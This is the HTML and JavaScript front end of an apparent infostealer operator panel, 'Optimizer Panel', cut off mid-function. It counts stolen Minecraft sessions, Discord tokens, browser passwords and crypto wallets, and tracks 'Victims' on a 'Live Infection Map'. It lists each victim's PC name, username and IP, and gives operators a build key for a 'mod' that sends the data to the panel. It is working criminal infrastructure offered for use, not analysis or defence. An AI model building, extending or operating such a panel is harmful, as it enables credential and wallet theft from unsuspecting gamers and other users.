<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Optimizer Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #12121a;
            --bg-card: #1a1a24;
            --bg-hover: #22222e;
            --accent: #6366f1;
            --accent-hover: #818cf8;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --text-primary: #ffffff;
            --text-secondary: #a1a1aa;
            --text-muted: #71717a;
            --border: #27272a;
            --mc-green: #44ff44;
            --discord-blue: #5865f2;
        }
        body { font-family: 'Inter', sans-serif; background: var(--bg-primary); color: var(--text-primary); min-height: 100vh; }
        
        /* Login */
        .login-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(ellipse at top, #1a1a2e 0%, var(--bg-primary) 50%); }
        .login-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; padding: 40px; width: 100%; max-width: 400px; }
        .login-logo { text-align: center; margin-bottom: 32px; }
        .login-logo i { font-size: 48px; color: var(--accent); margin-bottom: 16px; display: block; }
        .login-logo h1 { font-size: 24px; margin-bottom: 8px; }
        .login-logo p { color: var(--text-secondary); font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; color: var(--text-secondary); }
        .form-group input { width: 100%; padding: 12px 16px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-size: 14px; transition: all 0.2s; }
        .form-group input:focus { outline: none; border-color: var(--accent); }
        .btn { padding: 12px 20px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; gap: 8px; }
        .btn-primary { background: var(--accent); color: white; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-secondary { background: var(--bg-hover); color: var(--text-primary); border: 1px solid var(--border); }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .btn-icon { padding: 8px; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
        .error-msg { background: rgba(239,68,68,0.1); border: 1px solid var(--danger); color: var(--danger); padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: none; }
        .register-link { text-align: center; margin-top: 20px; color: var(--text-secondary); font-size: 14px; }
        .register-link span { color: var(--text-muted); cursor: not-allowed; }
        
        /* App */
        .app { display: none; min-height: 100vh; }
        .sidebar { position: fixed; left: 0; top: 0; bottom: 0; width: 260px; background: var(--bg-secondary); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; }
        .sidebar-logo { display: flex; align-items: center; gap: 12px; padding-bottom: 24px; border-bottom: 1px solid var(--border); margin-bottom: 24px; }
        .sidebar-logo i { font-size: 28px; color: var(--accent); }
        .sidebar-logo span { font-size: 18px; font-weight: 700; }
        .nav-item { display: flex; align-items: center; gap: 12px; padding: 12px 16px; border-radius: 8px; color: var(--text-secondary); cursor: pointer; transition: all 0.2s; margin-bottom: 4px; }
        .nav-item:hover { background: var(--bg-hover); color: var(--text-primary); }
        .nav-item.active { background: var(--accent); color: white; }
        .nav-item i { width: 20px; }
        .nav-section { font-size: 11px; text-transform: uppercase; color: var(--text-muted); padding: 16px 16px 8px; letter-spacing: 0.5px; }
        .user-info { margin-top: auto; padding: 16px; background: var(--bg-card); border-radius: 8px; }
        .user-info-name { font-weight: 600; margin-bottom: 4px; }
        .user-info-role { font-size: 12px; color: var(--accent); }
        
        .main { margin-left: 260px; padding: 24px; }
        .page { display: none; }
        .page.active { display: block; }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
        .page-title { font-size: 24px; font-weight: 700; }
        
        /* Stats */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 24px; }
        .stat-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; }
        .stat-card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .stat-card-icon { width: 40px; height: 40px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
        .stat-card-icon.purple { background: rgba(99,102,241,0.2); color: var(--accent); }
        .stat-card-icon.green { background: rgba(16,185,129,0.2); color: var(--success); }
        .stat-card-icon.yellow { background: rgba(245,158,11,0.2); color: var(--warning); }
        .stat-card-icon.red { background: rgba(239,68,68,0.2); color: var(--danger); }
        .stat-card-icon.blue { background: rgba(88,101,242,0.2); color: var(--discord-blue); }
        .stat-card-icon.mc { background: rgba(68,255,68,0.2); color: var(--mc-green); }
        .stat-card-value { font-size: 28px; font-weight: 700; }
        .stat-card-label { font-size: 14px; color: var(--text-secondary); }
        
        /* Log Cards */
        .logs-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 16px; }
        .log-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; transition: all 0.2s; }
        .log-card:hover { border-color: var(--accent); transform: translateY(-2px); }
        .log-card-header { padding: 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .log-card-type { display: flex; align-items: center; gap: 10px; }
        .log-type-badge { padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
        .log-type-badge.minecraft { background: rgba(68,255,68,0.15); color: var(--mc-green); }
        .log-type-badge.discord { background: rgba(88,101,242,0.15); color: var(--discord-blue); }
        .log-type-badge.browser { background: rgba(245,158,11,0.15); color: var(--warning); }
        .log-type-badge.wallet { background: rgba(239,68,68,0.15); color: var(--danger); }
        .log-type-badge.system { background: rgba(99,102,241,0.15); color: var(--accent); }
        .log-card-actions { display: flex; gap: 8px; }
        .log-card-body { padding: 16px; }
        .log-info-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; font-size: 13px; }
        .log-info-row i { color: var(--text-muted); width: 16px; }
        .log-info-row span { color: var(--text-secondary); }
        .log-preview { background: var(--bg-secondary); border-radius: 8px; padding: 12px; margin-top: 12px; }
        .log-preview-title { font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; }
        .log-preview-content { font-family: 'Monaco', 'Menlo', monospace; font-size: 12px; color: var(--text-primary); word-break: break-all; }
        .log-preview-copy { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
        .copy-btn { background: var(--bg-hover); border: 1px solid var(--border); color: var(--text-secondary); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; transition: all 0.2s; }
        .copy-btn:hover { background: var(--accent); color: white; border-color: var(--accent); }
        .copy-btn.copied { background: var(--success); color: white; border-color: var(--success); }
        .log-card-footer { padding: 12px 16px; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: var(--text-muted); }
        
        /* Filter */
        .filter-bar { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
        .filter-btn { padding: 8px 16px; border-radius: 20px; background: var(--bg-card); border: 1px solid var(--border); color: var(--text-secondary); cursor: pointer; font-size: 13px; transition: all 0.2s; }
        .filter-btn:hover { border-color: var(--accent); }
        .filter-btn.active { background: var(--accent); border-color: var(--accent); color: white; }
        
        /* Table */
        .table-container { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border); }
        th { background: var(--bg-secondary); font-size: 12px; text-transform: uppercase; color: var(--text-muted); font-weight: 600; }
        tr:hover { background: var(--bg-hover); }
        
        /* Build Key */
        .build-key-box { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
        .build-key-label { font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; }
        .build-key-value { font-family: 'Monaco', monospace; font-size: 14px; color: var(--accent); word-break: break-all; }
        
        /* Toast */
        .toast { position: fixed; bottom: 24px; right: 24px; padding: 12px 20px; border-radius: 8px; font-size: 14px; z-index: 1000; animation: slideIn 0.3s; }
        .toast.success { background: var(--success); color: white; }
        .toast.error { background: var(--danger); color: white; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        
        /* Modal */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 100; align-items: center; justify-content: center; }
        .modal.active { display: flex; }
        .modal-content { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; width: 90%; max-width: 600px; max-height: 80vh; overflow: auto; }
        .modal-header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .modal-body { padding: 20px; }
        .modal-close { background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 20px; }
        
        .admin-only { display: none; }
        .is-admin .admin-only { display: flex; }
        
        /* World Map */
        .map-container { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; position: relative; }
        .map-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .map-stats { display: flex; gap: 24px; }
        .map-stat { text-align: center; }
        .map-stat-value { font-size: 24px; font-weight: 700; color: var(--danger); }
        .map-stat-label { font-size: 12px; color: var(--text-muted); }
        .map-wrapper { position: relative; width: 100%; height: 500px; background: var(--bg-primary); overflow: hidden; }
        .world-map { width: 100%; height: 100%; }
        .map-point { position: absolute; width: 12px; height: 12px; transform: translate(-50%, -50%); cursor: pointer; z-index: 10; }
        .map-point-dot { width: 12px; height: 12px; background: var(--danger); border-radius: 50%; animation: pulse 2s infinite; box-shadow: 0 0 20px var(--danger); }
        .map-point-ring { position: absolute; top: 50%; left: 50%; width: 30px; height: 30px; transform: translate(-50%, -50%); border: 2px solid var(--danger); border-radius: 50%; animation: ring 2s infinite; opacity: 0; }
        .map-point:hover .map-tooltip { display: block; }
        .map-tooltip { display: none; position: absolute; bottom: 100%; left: 50%; transform: translateX(-50%); background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 10px 14px; white-space: nowrap; z-index: 100; margin-bottom: 8px; }
        .map-tooltip::after { content: ''; position: absolute; top: 100%; left: 50%; transform: translateX(-50%); border: 6px solid transparent; border-top-color: var(--border); }
        .map-tooltip-title { font-weight: 600; margin-bottom: 4px; }
        .map-tooltip-info { font-size: 12px; color: var(--text-secondary); }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.7; } }
        @keyframes ring { 0% { transform: translate(-50%, -50%) scale(0.5); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(2); opacity: 0; } }
        .map-legend { position: absolute; bottom: 16px; right: 16px; background: rgba(10,10,15,0.9); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; }
        .map-legend-item { display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--text-secondary); }
        .map-legend-dot { width: 10px; height: 10px; background: var(--danger); border-radius: 50%; animation: pulse 2s infinite; }
    </style>
</head>
<body>
    <!-- Login -->
    <div class="login-container" id="loginPage">
        <div class="login-box">
            <div class="login-logo">
                <i class="fas fa-bolt"></i>
                <h1>Optimizer Panel</h1>
                <p>Login to access your dashboard</p>
            </div>
            <div class="error-msg" id="loginError"></div>
            <div class="form-group">
                <label>Username</label>
                <input type="text" id="loginUsername" placeholder="Enter username">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="loginPassword" placeholder="Enter password" onkeypress="if(event.key==='Enter')login()">
            </div>
            <button class="btn btn-primary" style="width: 100%;" onclick="login()">
                <i class="fas fa-sign-in-alt"></i> Login
            </button>
            <div class="register-link">
                Need an account? <span>Coming Soon</span>
            </div>
        </div>
    </div>

    <!-- App -->
    <div class="app" id="app">
        <aside class="sidebar">
            <div class="sidebar-logo">
                <i class="fas fa-bolt"></i>
                <span>Optimizer</span>
            </div>
            <nav>
                <div class="nav-item active" onclick="showPage('dashboard')">
                    <i class="fas fa-home"></i> Dashboard
                </div>
                <div class="nav-item" onclick="showPage('map')">
                    <i class="fas fa-globe-americas"></i> Live Map
                </div>
                <div class="nav-item" onclick="showPage('logs')">
                    <i class="fas fa-list"></i> Logs
                </div>
                <div class="nav-item" onclick="showPage('settings')">
                    <i class="fas fa-cog"></i> Settings
                </div>
                <div class="nav-section admin-only">Admin</div>
                <div class="nav-item admin-only" onclick="showPage('users')">
                    <i class="fas fa-users"></i> Users
                </div>
                <div class="nav-item admin-only" onclick="showPage('alllogs')">
                    <i class="fas fa-database"></i> All Logs
                </div>
            </nav>
            <div class="user-info">
                <div class="user-info-name" id="userName">User</div>
                <div class="user-info-role" id="userRole">Member</div>
            </div>
        </aside>

        <main class="main">
            <!-- Dashboard -->
            <div class="page active" id="page-dashboard">
                <div class="page-header">
                    <h1 class="page-title">Dashboard</h1>
                </div>
                <div class="stats-grid" id="statsGrid"></div>
                <h3 style="margin-bottom: 16px;">Recent Hits</h3>
                <div class="logs-grid" id="recentLogs"></div>
            </div>

            <!-- Live Map -->
            <div class="page" id="page-map">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-globe-americas" style="color: var(--danger); margin-right: 10px;"></i>Live Infection Map</h1>
                </div>
                <div class="map-container">
                    <div class="map-header">
                        <div>
                            <span style="color: var(--danger); font-weight: 600;"><i class="fas fa-circle" style="animation: pulse 2s infinite;"></i> LIVE</span>
                            <span style="color: var(--text-muted); margin-left: 12px;">Real-time global infections</span>
                        </div>
                        <div class="map-stats">
                            <div class="map-stat">
                                <div class="map-stat-value" id="mapTotalInfections">0</div>
                                <div class="map-stat-label">Total Infections</div>
                            </div>
                            <div class="map-stat">
                                <div class="map-stat-value" id="mapCountries">0</div>
                                <div class="map-stat-label">Countries</div>
                            </div>
                        </div>
                    </div>
                    <div class="map-wrapper" id="mapWrapper">
                        <!-- SVG World Map -->
                        <svg class="world-map" viewBox="0 0 1000 500" preserveAspectRatio="xMidYMid slice">
                            <defs>
                                <linearGradient id="mapGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                                    <stop offset="0%" style="stop-color:#1a1a24"/>
                                    <stop offset="100%" style="stop-color:#0a0a0f"/>
                                </linearGradient>
                            </defs>
                            <rect fill="url(#mapGradient)" width="1000" height="500"/>
                            <!-- Simplified World Continents -->
                            <g fill="#22222e" stroke="#333340" stroke-width="0.5">
                                <!-- North America -->
                                <path d="M150,120 L180,100 L220,95 L260,100 L280,120 L270,150 L250,180 L230,200 L200,210 L170,200 L140,180 L130,150 Z"/>
                                <path d="M130,150 L100,160 L80,180 L70,200 L90,220 L120,210 L140,190 Z"/>
                                <!-- Central America -->
                                <path d="M170,200 L180,230 L200,250 L210,270 L195,280 L175,270 L165,250 L160,230 Z"/>
                                <!-- South America -->
                                <path d="M210,270 L240,280 L270,320 L280,380 L260,420 L230,440 L200,420 L190,380 L200,340 L195,300 Z"/>
                                <!-- Europe -->
                                <path d="M440,100 L480,90 L520,95 L540,110 L530,130 L510,145 L480,150 L450,145 L430,130 L435,115 Z"/>
                                <!-- Africa -->
                                <path d="M450,170 L500,165 L540,180 L560,220 L550,280 L520,340 L480,360 L440,340 L420,290 L430,230 L440,190 Z"/>
                                <!-- Russia/Asia -->
                                <path d="M540,80 L600,70 L700,65 L800,80 L850,100 L830,130 L780,140 L700,135 L620,140 L560,130 L540,110 Z"/>
                                <!-- Middle East -->
                                <path d="M540,145 L580,140 L610,150 L620,170 L600,190 L560,185 L540,170 Z"/>
                                <!-- India -->
                                <path d="M620,170 L660,160 L680,180 L670,220 L640,250 L610,230 L620,200 Z"/>
                                <!-- China/East Asia -->
                                <path d="M700,130 L760,120 L800,130 L820,160 L800,190 L760,200 L720,195 L690,175 L700,150 Z"/>
                                <!-- Southeast Asia -->
                                <path d="M720,200 L760,210 L780,240 L760,280 L720,290 L690,270 L700,240 Z"/>
                                <!-- Japan -->
                                <path d="M840,140 L860,135 L870,150 L860,170 L840,165 Z"/>
                                <!-- Australia -->
                                <path d="M780,340 L840,330 L880,350 L890,400 L860,430 L810,440 L770,420 L760,380 Z"/>
                                <!-- New Zealand -->
                                <path d="M920,420 L930,410 L940,420 L935,440 L920,445 Z"/>
                                <!-- UK/Ireland -->
                                <path d="M420,105 L435,100 L445,110 L440,125 L425,120 Z"/>
                                <!-- Greenland -->
                                <path d="M300,50 L350,40 L380,50 L375,80 L340,90 L310,80 Z"/>
                                <!-- Iceland -->
                                <path d="M380,70 L400,65 L410,75 L400,85 L385,80 Z"/>
                            </g>
                            <!-- Grid lines -->
                            <g stroke="#1a1a24" stroke-width="0.3" opacity="0.5">
                                <line x1="0" y1="125" x2="1000" y2="125"/>
                                <line x1="0" y1="250" x2="1000" y2="250"/>
                                <line x1="0" y1="375" x2="1000" y2="375"/>
                                <line x1="250" y1="0" x2="250" y2="500"/>
                                <line x1="500" y1="0" x2="500" y2="500"/>
                                <line x1="750" y1="0" x2="750" y2="500"/>
                            </g>
                        </svg>
                        <!-- Infection points will be added here -->
                        <div id="mapPoints"></div>
                        <div class="map-legend">
                            <div class="map-legend-item">
                                <div class="map-legend-dot"></div>
                                <span>Active Infection</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Logs -->
            <div class="page" id="page-logs">
                <div class="page-header">
                    <h1 class="page-title">Logs</h1>
                </div>
                <div class="filter-bar">
                    <button class="filter-btn active" onclick="filterLogs('all')">All</button>
                    <button class="filter-btn" onclick="filterLogs('minecraft')"><i class="fas fa-cube"></i> Minecraft</button>
                    <button class="filter-btn" onclick="filterLogs('discord')"><i class="fab fa-discord"></i> Discord</button>
                    <button class="filter-btn" onclick="filterLogs('browser')"><i class="fas fa-globe"></i> Browser</button>
                    <button class="filter-btn" onclick="filterLogs('wallet')"><i class="fas fa-wallet"></i> Wallet</button>
                </div>
                <div class="logs-grid" id="logsGrid"></div>
            </div>

            <!-- Settings -->
            <div class="page" id="page-settings">
                <div class="page-header">
                    <h1 class="page-title">Settings</h1>
                </div>
                <div class="table-container" style="padding: 24px;">
                    <h3 style="margin-bottom: 20px;">Build Key</h3>
                    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Use this key in your mod:</p>
                    <div class="build-key-box">
                        <div class="build-key-label">YOUR BUILD KEY</div>
                        <div class="build-key-value" id="buildKey">Loading...</div>
                    </div>
                    
                    <h3 style="margin: 32px 0 20px;">API Endpoint</h3>
                    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Mod sends data to:</p>
                    <div class="build-key-box">
                        <div class="build-key-label">ENDPOINT URL</div>
                        <div class="build-key-value" id="apiEndpoint">Loading...</div>
                    </div>
                    
                    <h3 style="margin: 32px 0 20px;">Change Password</h3>
                    <div class="form-group">
                        <label>Current Password</label>
                        <input type="password" id="currentPassword">
                    </div>
                    <div class="form-group">
                        <label>New Password</label>
                        <input type="password" id="newPassword">
                    </div>
                    <button class="btn btn-primary" onclick="changePassword()">Change Password</button>
                    
                    <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--border);">
                        <button class="btn btn-secondary" onclick="logout()">
                            <i class="fas fa-sign-out-alt"></i> Logout
                        </button>
                    </div>
                </div>
            </div>

            <!-- Users (Admin) -->
            <div class="page" id="page-users">
                <div class="page-header">
                    <h1 class="page-title">User Management</h1>
                    <button class="btn btn-primary" onclick="showCreateUser()">
                        <i class="fas fa-plus"></i> Add User
                    </button>
                </div>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>User</th>
                                <th>Build Key</th>
                                <th>Stats</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="usersTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- All Logs (Admin) -->
            <div class="page" id="page-alllogs">
                <div class="page-header">
                    <h1 class="page-title">All Logs</h1>
                </div>
                <div class="logs-grid" id="allLogsGrid"></div>
            </div>
        </main>
    </div>

    <!-- Modal -->
    <div class="modal" id="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modalTitle">Details</h3>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body" id="modalBody"></div>
        </div>
    </div>

    <script>
        const API = '';
        let token = localStorage.getItem('token');
        let currentUser = null;
        let allLogs = [];

        async function api(endpoint, method = 'GET', body = null) {
            const opts = {
                method,
                headers: { 'Content-Type': 'application/json' }
            };
            if (token) opts.headers['Authorization'] = `Bearer ${token}`;
            if (body) opts.body = JSON.stringify(body);
            
            try {
                const res = await fetch(API + endpoint, opts);
                return await res.json();
            } catch (e) {
                return { success: false, error: 'Network error' };
            }
        }

        function toast(msg, type = 'success') {
            const t = document.createElement('div');
            t.className = `toast ${type}`;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }

        // Auth
        async function login() {
            const username = document.getElementById('loginUsername').value;
            const password = document.getElementById('loginPassword').value;
            
            const res = await api('/api/auth/login', 'POST', { username, password });
            
            if (res.success) {
                token = res.token;
                currentUser = res.user;
                localStorage.setItem('token', token);
                showApp();
            } else {
                document.getElementById('loginError').textContent = res.error;
                document.getElementById('loginError').style.display = 'block';
            }
        }

        function logout() {
            token = null;
            currentUser = null;
            localStorage.removeItem('token');
            document.getElementById('loginPage').style.display = 'flex';
            document.getElementById('app').style.display = 'none';
        }

        async function checkAuth() {
            if (!token) return false;
            const res = await api('/api/auth/verify');
            if (res.success) {
                currentUser = res.user;
                return true;
            }
            return false;
        }

        async function showApp() {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('app').style.display = 'block';
            document.getElementById('userName').textContent = currentUser.username;
            document.getElementById('userRole').textContent = currentUser.is_admin ? 'Admin' : 'Member';
            
            if (currentUser.is_admin) {
                document.getElementById('app').classList.add('is-admin');
            }
            
            loadDashboard();
            loadSettings();
        }

        function showPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('page-' + page).classList.add('active');
            event.target.closest('.nav-item').classList.add('active');
            
            if (page === 'logs') loadLogs();
            if (page === 'users') loadUsers();
            if (page === 'alllogs') loadAllLogs();
            if (page === 'map') loadMap();
        }

        // Country coordinates for map (approximate center points on our SVG)
        const countryCoords = {
            'US': { x: 200, y: 160 }, 'CA': { x: 180, y: 120 }, 'MX': { x: 180, y: 220 },
            'BR': { x: 240, y: 350 }, 'AR': { x: 230, y: 420 }, 'CL': { x: 210, y: 400 },
            'GB': { x: 430, y: 110 }, 'DE': { x: 480, y: 120 }, 'FR': { x: 460, y: 130 },
            'ES': { x: 445, y: 145 }, 'IT': { x: 490, y: 140 }, 'NL': { x: 470, y: 115 },
            'PL': { x: 510, y: 120 }, 'RU': { x: 700, y: 100 }, 'UA': { x: 540, y: 125 },
            'TR': { x: 550, y: 155 }, 'SA': { x: 570, y: 185 }, 'AE': { x: 590, y: 195 },
            'IN': { x: 650, y: 200 }, 'CN': { x: 750, y: 165 }, 'JP': { x: 850, y: 155 },
            'KR': { x: 820, y: 160 }, 'TH': { x: 720, y: 230 }, 'VN': { x: 740, y: 225 },
            'ID': { x: 760, y: 280 }, 'PH': { x: 790, y: 235 }, 'AU': { x: 830, y: 380 },
            'NZ': { x: 930, y: 430 }, 'ZA': { x: 500, y: 360 }, 'NG': { x: 475, y: 250 },
            'EG': { x: 520, y: 190 }, 'KE': { x: 540, y: 280 }, 'SE': { x: 495, y: 95 },
            'NO': { x: 475, y: 90 }, 'FI': { x: 520, y: 90 }, 'DK': { x: 475, y: 105 },
            'AT': { x: 490, y: 130 }, 'CH': { x: 475, y: 130 }, 'BE': { x: 465, y: 120 },
            'PT': { x: 430, y: 145 }, 'GR': { x: 515, y: 150 }, 'CZ': { x: 500, y: 125 },
            'RO': { x: 520, y: 135 }, 'HU': { x: 505, y: 130 }, 'IE': { x: 415, y: 110 },
            'SG': { x: 730, y: 265 }, 'MY': { x: 720, y: 255 }, 'PK': { x: 620, y: 180 },
            'BD': { x: 670, y: 200 }, 'CO': { x: 205, y: 270 }, 'PE': { x: 200, y: 310 },
            'VE': { x: 225, y: 260 }, 'IL': { x: 550, y: 170 }, 'IR': { x: 590, y: 165 },
            'Unknown': { x: 500, y: 250 }
        };

        // Load Map
        async function loadMap() {
            const res = await api('/api/logs?limit=500');
            if (!res.success) return;
            
            const logs = res.logs;
            const countries = {};
            const infections = [];
            
            logs.forEach(log => {
                const country = log.country || 'Unknown';
                if (!countries[country]) {
                    countries[country] = { count: 0, logs: [] };
                }
                countries[country].count++;
                countries[country].logs.push(log);
            });
            
            // Update stats
            document.getElementById('mapTotalInfections').textContent = logs.length;
            document.getElementById('mapCountries').textContent = Object.keys(countries).length;
            
            // Generate points
            const pointsContainer = document.getElementById('mapPoints');
            pointsContainer.innerHTML = '';
            
            Object.entries(countries).forEach(([country, data]) => {
                const coords = countryCoords[country] || countryCoords['Unknown'];
                // Add some random offset for multiple infections in same country
                const offsetX = (Math.random() - 0.5) * 30;
                const offsetY = (Math.random() - 0.5) * 20;
                
                const point = document.createElement('div');
                point.className = 'map-point';
                point.style.left = `${(coords.x + offsetX) / 10}%`;
                point.style.top = `${(coords.y + offsetY) / 5}%`;
                
                const lastLog = data.logs[0];
                const time = new Date(lastLog.created_at).toLocaleString();
                
                point.innerHTML = `
                    <div class="map-point-dot"></div>
                    <div class="map-point-ring"></div>
                    <div class="map-tooltip">
                        <div class="map-tooltip-title">${country} <span style="color: var(--danger)">(${data.count})</span></div>
                        <div class="map-tooltip-info">
                            <i class="fas fa-desktop"></i> ${lastLog.pc_name}<br>
                            <i class="fas fa-clock"></i> ${time}
                        </div>
                    </div>
                `;
                
                pointsContainer.appendChild(point);
            });
        }

        // Dashboard
        async function loadDashboard() {
            const res = await api('/api/dashboard');
            if (!res.success) return;
            
            const s = res.stats;
            document.getElementById('statsGrid').innerHTML = `
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon mc"><i class="fas fa-cube"></i></div>
                    </div>
                    <div class="stat-card-value">${s.mc_sessions || 0}</div>
                    <div class="stat-card-label">MC Sessions</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon blue"><i class="fab fa-discord"></i></div>
                    </div>
                    <div class="stat-card-value">${s.tokens || 0}</div>
                    <div class="stat-card-label">Discord Tokens</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon yellow"><i class="fas fa-key"></i></div>
                    </div>
                    <div class="stat-card-value">${s.passwords || 0}</div>
                    <div class="stat-card-label">Passwords</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon red"><i class="fas fa-wallet"></i></div>
                    </div>
                    <div class="stat-card-value">${s.wallets || 0}</div>
                    <div class="stat-card-label">Wallets</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon purple"><i class="fas fa-users"></i></div>
                    </div>
                    <div class="stat-card-value">${s.victims || 0}</div>
                    <div class="stat-card-label">Victims</div>
                </div>
            `;
            
            allLogs = res.logs;
            renderLogs(res.logs.slice(0, 6), 'recentLogs');
        }

        // Logs
        async function loadLogs() {
            const res = await api('/api/logs?limit=200');
            if (res.success) {
                allLogs = res.logs;
                renderLogs(res.logs, 'logsGrid');
            }
        }

        function filterLogs(type) {
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            event.target.classList.add('active');
            
            const filtered = type === 'all' ? allLogs : allLogs.filter(l => l.log_type === type);
            renderLogs(filtered, 'logsGrid');
        }

        function renderLogs(logs, containerId) {
            const container = document.getElementById(containerId);
            if (!logs.length) {
                container.innerHTML = '<p style="color: var(--text-muted); padding: 20px;">No logs yet</p>';
                return;
            }
            
            container.innerHTML = logs.map(log => {
                const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
                const preview = getPreview(log.log_type, data);
                const icon = getTypeIcon(log.log_type);
                const time = new Date(log.created_at).toLocaleString();
                
                return `
                <div class="log-card">
                    <div class="log-card-header">
                        <div class="log-card-type">
                            <span class="log-type-badge ${log.log_type}">${icon} ${log.log_type}</span>
                        </div>
                        <div class="log-card-actions">
                            <button class="btn btn-secondary btn-icon" onclick="downloadLog(${log.id})" title="Download">
                                <i class="fas fa-download"></i>
                            </button>
                            <button class="btn btn-secondary btn-icon" onclick="deleteLog(${log.id})" title="Delete">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </div>
                    <div class="log-card-body">
                        <div class="log-info-row">
                            <i class="fas fa-desktop"></i>
                            <span>${log.pc_name}</span>
                        </div>
                        <div class="log-info-row">
                            <i class="fas fa-user"></i>
                            <span>${log.pc_user}</span>
                        </div>
                        <div class="log-info-row">
                            <i class="fas fa-globe"></i>
                            <span>${log.ip} (${log.country})</span>
                        </div>
                        ${preview}
                    </div>
                    <div class="log-card-footer">
                        <span>${time}</span>
                        <button class="btn btn-secondary btn-sm" onclick="showLogDetail(${log.id})">View Details</button>
                    </div>
                </div>
                `;
            }).join('');
        }

        function getTypeIcon(type) {
            const icons = {
                minecraft: '<i class="fas fa-cube"></i>',
                discord: '<i class="fab fa-discord"></i>',
                browser: '<i class="fas fa-globe"></i>',
                wallet: '<i class="fas fa-wallet"></i>',
                system: '<i class="fas fa-laptop"></i>'
            };
            return icons[type] || '<i class="fas fa-file"></i>';
        }

        function getPreview(type, data) {
            if (!data) return '';
            
            if (type === 'minecraft') {
